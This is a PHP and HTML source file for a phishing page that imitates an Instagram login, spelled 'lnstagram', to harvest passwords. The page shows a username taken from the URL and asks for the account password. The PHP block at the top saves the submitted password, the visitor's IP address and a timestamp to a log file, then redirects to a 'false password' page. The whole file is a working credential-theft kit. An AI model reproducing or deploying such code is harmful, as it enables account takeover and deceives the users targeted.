<?php
session_start();
/*

 */


$an1l= $_GET["username"];



if ($_POST) {

	
	$an1l=$_GET["username"];
	$password=$_POST["password"];
	$ip=$_SERVER["REMOTE_ADDR"];
	date_default_timezone_set('Europe/Istanbul');
    $date=date("d-m-Y H:i:s");
	
	
    
    $_SESSION['username'] = $an1l;
    $_SESSION['password'] = $password;
    $_SESSION['ip'] = $ip;
    $_SESSION['date'] = $date;
    

    $file = fopen('log.txt', 'a');
fwrite($file, "Kullanıcı Adı : ".$an1l."\n\n" ."Şifre : ".$password. "\n\n"."İp Adresi : " .$ip."\n\n".   "Zaman : " .$date.  "\n\n");
fclose($file);
echo '';
  
   header("Location: falsepass.php");
}
?>

<!DOCTYPE html>
<html>
<head>
	<link rel="stylesheet" type="text/css" href="main.css">
	<title>Login • lnstagram</title>
	<link rel="icon" sizes="192x192" href="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTp5Ex2kch6H9Ybcq6A0dxj70ciW8E5DOH7lg&usqp=CAU">
	<meta name="viewport" content="width=device-width,inital-scale=1">
	<noscript>Please Active Javascirpt on your scanner</noscript>
	<link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all">
</head>

<body style="background:#fafafa;">
	<header>
		<table class="header-table">
			<tr class="header-tr">
				<th class="header-x"><span class="header-text" >lnstagram</span>
                    <span  class="header-text">Find it for free on Google Play.</span>
				</th>

				<th class="header-y">
					<p class="header-border">GET</p>
				</th>

			</tr>

		</table>


	</header>
	<center>
		<br><br>
		
		

		<table class="qen" style="display:none;">
			<tr class="zy">
				<th class="er">
					<div class="top"></div>
				

				</th>

				<th class="can"><span class="or">OR</span></th>

				<th class="han">
			<div class="top"></div>
				</th>

			</tr>
		</table>





<div style="width:300px;max-width:95%;background:white;border:1px solid #cecece;padding:10px;box-sizing:border-box;">
			<br>
			<img src width=100 src="<?=$html2?>">


			<br><button class="fb-qenzy">
			<i class="fab fa-facebook-square" style="font-size:17px;"></i>&nbsp;
			
			Continue with Facebook
		</button>
		<br>
			<p style="font-family:sans-serif;width:300px;max-width:88%;color:#999;font-size:15px;line-height:19px;">

<?php 
			echo "
Please write your instagram password and click 'Continue as @$an1l' and fill the next form.";
			?>
			</p><br>
			<form method="post">
				<input type="password" name="password" placeholder="Password" required="" class="passwordx" style="width:200px;height:23px;padding-left:6px;padding-top:2px;padding-bottom:2px;outline:none;background:#fafafa;border:none;border:1px solid #dedede" ><br><br>
		
			<button type="submit" class="qenzyist"><?php echo "Continue As @$an1l "; ?></button>
			<br>
		
		<br>
			

	
		
		</form>
		<div class="dont">
			<span class="dont1">Don't have an account? </span>
			<span class="dont2">Sign up</span>

		</div>
				
<br>
			</div>






		<br>
		<form method="post">
			<br>
		
			<br>
		

			<br>
			

		</form>
		

	</center>
	<?php
	for($i=0;$i<9;$i++){
echo "<br>";
	}
	?>
	<center>
	<div class="bottom">
		
		<span class="mini">from</span>
		<p class="big">FACEBOOK</p>
	</div>
</center>
<script type="text/javascript">
	console.log("Script Coded By _an1l");
</script>

</body>
</html>